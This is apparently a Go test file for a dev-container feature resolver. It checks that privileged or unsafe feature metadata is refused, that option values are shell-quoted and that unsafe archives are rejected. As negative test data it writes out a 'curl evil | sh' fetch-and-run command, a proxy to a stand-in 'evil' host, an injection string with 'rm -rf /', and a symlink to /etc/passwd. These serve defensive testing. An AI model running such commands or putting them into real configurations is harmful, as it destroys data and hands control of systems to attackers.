package feature

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/wstein/workharbor/internal/oci"
)

var bg = context.Background()

func TestAFeatureThatAsksForMoreThanTheSubsetIsRefused(t *testing.T) {
	for name, body := range map[string]string{
		"privileged":       `{"id":"x","privileged":true}`,
		"mounts":           `{"id":"x","mounts":[{"source":"a","target":"b","type":"bind"}]}`,
		"capAdd":           `{"id":"x","capAdd":["SYS_ADMIN"]}`,
		"securityOpt":      `{"id":"x","securityOpt":["seccomp=unconfined"]}`,
		"init":             `{"id":"x","init":true}`,
		"entrypoint":       `{"id":"x","entrypoint":"/bin/sh"}`,
		"onCreateCommand":  `{"id":"x","onCreateCommand":"curl evil | sh"}`,
		"postStartCommand": `{"id":"x","postStartCommand":["sh","-c","x"]}`,
		"dependsOn":        `{"id":"x","dependsOn":{"ghcr.io/a/b:1":{}}}`,
		"HTTPS_PROXY":      `{"id":"x","containerEnv":{"HTTPS_PROXY":"http://evil"}}`,
		"https_proxy":      `{"id":"x","containerEnv":{"https_proxy":"http://evil"}}`,
		"a *_PROXY":        `{"id":"x","containerEnv":{"FOO_PROXY":"x"}}`,
		"LD_PRELOAD":       `{"id":"x","containerEnv":{"LD_PRELOAD":"/x.so"}}`,
		"LD_LIBRARY_PATH":  `{"id":"x","containerEnv":{"LD_LIBRARY_PATH":"/x"}}`,
		"HOME":             `{"id":"x","containerEnv":{"HOME":"/tmp"}}`,
		"WHR_":             `{"id":"x","containerEnv":{"WHR_TOKEN":"x"}}`,
		"a vendor prefix":  `{"id":"x","containerEnv":{"ANTHROPIC_API_KEY":"x"}}`,
		"a bad name":       `{"id":"x","containerEnv":{"A B":"x"}}`,
		"a newline":        `{"id":"x","containerEnv":{"A":"x\ny"}}`,
	} {
		_, err := ParseMetadata([]byte(body))
		if !errors.Is(err, ErrRefused) {
			t.Errorf("%s: %v, want ErrRefused", name, err)
		}
	}
	// false, null and empty values ask for nothing; PATH may change
	ok := `{"id":"node","version":"1.7.1","privileged":false,"init":false,"capAdd":[],"mounts":null,"entrypoint":"", "containerEnv":{"PATH":"/usr/local/share/nvm/current/bin:${PATH}","NVM_DIR":"/usr/local/share/nvm"}, "options":{"version":{"type":"string","default":"lts"},"nodeGypDependencies":{"type":"boolean","default":true}}, "installsAfter":["ghcr.io/devcontainers/features/common-utils"]}`
	m, err := ParseMetadata([]byte(ok))
	if err != nil {
		t.Fatal(err)
	}
	if m.ContainerEnv["PATH"] == "" || m.Options["nodeGypDependencies"].Default != "true" || m.Options["version"].Default != "lts" || len(m.InstallsAfter) != 1 {
		t.Errorf("metadata = %+v", m)
	}
}

func TestOptionsAreCheckedAndMergedOverTheDefaults(t *testing.T) {
	m := Metadata{Options: map[string]Option{
		"version":     {Default: "lts"},
		"installYarn": {Type: "boolean", Default: "true"},
		"flavour":     {Enum: []string{"a", "b"}, Default: "a"},
	}}
	vars, err := m.ResolveOptions(map[string]string{"version": "20", "installYarn": "false"})
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, v := range vars {
		got[v[0]] = v[1]
	}
	if got["VERSION"] != "20" || got["INSTALLYARN"] != "false" || got["FLAVOUR"] != "a" || len(got) != 3 {
		t.Errorf("vars = %v", got)
	}
	for name, set := range map[string]map[string]string{
		"undeclared":      {"nope": "x"},
		"not a boolean":   {"installYarn": "yes"},
		"not in the enum": {"flavour": "c"},
		"a newline":       {"version": "1\n2"},
		"too long":        {"version": strings.Repeat("x", 2000)},
	} {
		if _, err := m.ResolveOptions(set); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
	if EnvName("node-gyp.deps") != "NODE_GYP_DEPS" {
		t.Errorf("EnvName = %q", EnvName("node-gyp.deps"))
	}
}

func TestFeaturesInstallInFileOrderExceptWhereInstallsAfterSays(t *testing.T) {
	refs := []string{"ghcr.io/x/features/node:1", "ghcr.io/x/features/common-utils:2", "ghcr.io/x/features/go:1"}
	none := [][]string{nil, nil, nil}
	if got, _, err := Order(refs, none); err != nil || len(got) != 3 || got[0] != 0 || got[1] != 1 || got[2] != 2 {
		t.Errorf("file order = %v, %v", got, err)
	}
	// node wants common-utils first; go is unconstrained and keeps its place
	got, notes, err := Order(refs, [][]string{{"ghcr.io/x/features/common-utils"}, nil, nil})
	if err != nil || len(got) != 3 || got[0] != 1 || got[1] != 0 || got[2] != 2 || len(notes) != 0 {
		t.Errorf("order = %v, %v, %v", got, notes, err)
	}
	// a feature that is not in the file is noted and never fetched
	_, notes, err = Order(refs[:1], [][]string{{"ghcr.io/x/features/oryx"}})
	if err != nil || len(notes) != 1 || !strings.Contains(notes[0], "oryx") {
		t.Errorf("a missing dependency: %v, %v", notes, err)
	}
	// a cycle is refused
	if _, _, err := Order(refs[:2], [][]string{{"ghcr.io/x/features/common-utils"}, {"ghcr.io/x/features/node"}}); !errors.Is(err, ErrRefused) {
		t.Errorf("a cycle: %v", err)
	}
	// a feature that names itself waits on nothing
	if got, _, err := Order(refs[:1], [][]string{{"ghcr.io/x/features/node"}}); err != nil || len(got) != 1 {
		t.Errorf("self: %v %v", got, err)
	}
}

func TestTheDockerfileInstallsInOrderAndWritesContainerEnvAsENV(t *testing.T) {
	node := Resolved{Ref: "ghcr.io/devcontainers/features/node:1", Meta: Metadata{ContainerEnv: map[string]string{"PATH": "/opt/nvm/bin:${PATH}", "NVM_DIR": `/opt/"nvm"`}}}
	py := Resolved{Ref: "ghcr.io/devcontainers/features/python:1"}
	df := Dockerfile("docker.io/library/ubuntu@sha256:abc", []Resolved{node, py})
	for _, want := range []string{
		"FROM docker.io/library/ubuntu@sha256:abc\n", "USER root\n", "COPY features/ /tmp/whr-features/\n",
		"RUN set -e; cd /tmp/whr-features/0 && chmod +x install.sh && . ./whr-options.env && ./install.sh\n",
		"RUN set -e; cd /tmp/whr-features/1 && ", "RUN rm -rf /tmp/whr-features\n",
		`ENV NVM_DIR="/opt/\"nvm\""` + "\n", `ENV PATH="/opt/nvm/bin:${PATH}"` + "\n", // PATH keeps its $
	} {
		if !strings.Contains(df, want) {
			t.Errorf("the Dockerfile lacks %q:\n%s", want, df)
		}
	}
	if strings.Index(df, "whr-features/0") > strings.Index(df, "whr-features/1") {
		t.Error("the features are not installed in order")
	}
}

func tarOf(t *testing.T, files map[string]string, extra ...*tar.Header) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeReg, Mode: 0o755, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		_, _ = tw.Write([]byte(body))
	}
	for _, h := range extra {
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
	}
	_ = tw.Close()
	return buf.Bytes()
}

// A fake ghcr.io: one feature's manifest and blob.
func fakeRegistry(t *testing.T, blob []byte) *oci.Client {
	t.Helper()
	sum := sha256.Sum256(blob)
	layer := oci.Descriptor{MediaType: oci.MediaFeatureLayer, Digest: "sha256:" + hex.EncodeToString(sum[:]), Size: int64(len(blob))}
	manifest, _ := json.Marshal(map[string]any{"schemaVersion": 2, "mediaType": oci.MediaManifest, "layers": []oci.Descriptor{layer}})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/manifests/"):
			_, _ = w.Write(manifest)
		case strings.Contains(r.URL.Path, "/blobs/"):
			_, _ = w.Write(blob)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(srv.Close)
	return oci.New(oci.Config{HTTP: &http.Client{}, BaseURL: func(string) string { return srv.URL }})
}

const nodeJSON = `{"id":"node","version":"1.7.1","options":{"version":{"type":"string","default":"lts"}}, "containerEnv":{"NVM_DIR":"/usr/local/share/nvm","PATH":"/usr/local/share/nvm/current/bin:${PATH}"}}`

func TestResolveFetchesChecksAndPinsAFeature(t *testing.T) {
	blob := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON, "install.sh": "#!/bin/sh\necho installed\n"})
	r := &Resolver{Client: fakeRegistry(t, blob)}
	f, err := r.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features/node:1", Options: map[string]string{"version": "20"}})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(f.Digest, "sha256:") || f.Meta.ID != "node" || len(f.Vars) != 1 || f.Vars[0] != [2]string{"VERSION", "20"} {
		t.Fatalf("resolved = %+v", f)
	}
	// staged: the archive is extracted again with the options file beside it
	dir := t.TempDir()
	df, err := Stage(dir, "ubuntu:24.04", []Resolved{f}, oci.ExtractLimits{})
	if err != nil {
		t.Fatal(err)
	}
	env, err := os.ReadFile(filepath.Join(dir, "features", "0", "whr-options.env")) //nolint:gosec // a test path
	if err != nil || !strings.Contains(string(env), "export VERSION='20'\n") || !strings.Contains(string(env), "export _REMOTE_USER='root'\n") {
		t.Errorf("options file = %q, %v", env, err)
	}
	if _, err := os.Stat(filepath.Join(dir, "features", "0", "install.sh")); err != nil {
		t.Error("install.sh was not staged")
	}
	if !strings.Contains(df, "ENV NVM_DIR=") {
		t.Errorf("Dockerfile = %s", df)
	}
}

func TestOptionValuesAreQuotedForTheShell(t *testing.T) {
	f := Resolved{Vars: [][2]string{{"MSG", `it's "x" $(touch /tmp/pwned) ; rm -rf /`}}}
	got := f.optionsFile()
	want := `export MSG='it'\''s "x" $(touch /tmp/pwned) ; rm -rf /'` + "\n"
	if !strings.HasPrefix(got, want) {
		t.Errorf("options file = %q, want it to start with %q", got, want)
	}
}

func TestResolveRefusesAForeignSourceUnlessAllowedAndAnUnsafeFeature(t *testing.T) {
	blob := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON, "install.sh": "x"})
	c := fakeRegistry(t, blob)
	r := &Resolver{Client: c}
	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); !errors.Is(err, ErrSourceNotAllowed) {
		t.Errorf("a foreign source: %v", err)
	}
	r.Approved = func(ref string) bool { return ref == "ghcr.io/someone/else/thing:1" }
	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); err != nil {
		t.Errorf("an approved source: %v", err)
	}
	// a look-alike path is not the allowed prefix
	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features-evil/x:1"}); !errors.Is(err, ErrSourceNotAllowed) {
		t.Errorf("a look-alike prefix: %v", err)
	}
	bad := tarOf(t, map[string]string{"devcontainer-feature.json": `{"id":"x","privileged":true}`, "install.sh": "x"})
	rb := &Resolver{Client: fakeRegistry(t, bad)}
	if _, err := rb.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features/x:1"}); !errors.Is(err, ErrRefused) {
		t.Errorf("a privileged feature: %v", err)
	}
	noInstall := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON})
	rn := &Resolver{Client: fakeRegistry(t, noInstall)}
	if _, err := rn.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features/x:1"}); err == nil {
		t.Error("a feature with no install.sh was accepted")
	}
	evil := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON, "install.sh": "x"}, &tar.Header{Name: "link", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd"})
	re := &Resolver{Client: fakeRegistry(t, evil)}
	if _, err := re.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features/x:1"}); !errors.Is(err, oci.ErrUnsafeArchive) {
		t.Errorf("an archive with a link: %v", err)
	}
	// an archive that brings its own options file cannot take over the one the supervisor writes
	own := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON, "install.sh": "x", "whr-options.env": "export VERSION=evil"})
	ro := &Resolver{Client: fakeRegistry(t, own)}
	f, err := ro.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features/x:1"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Stage(t.TempDir(), "ubuntu:24.04", []Resolved{f}, oci.ExtractLimits{}); err == nil {
		t.Error("an archive's own whr-options.env was overwritten or accepted")
	}
}
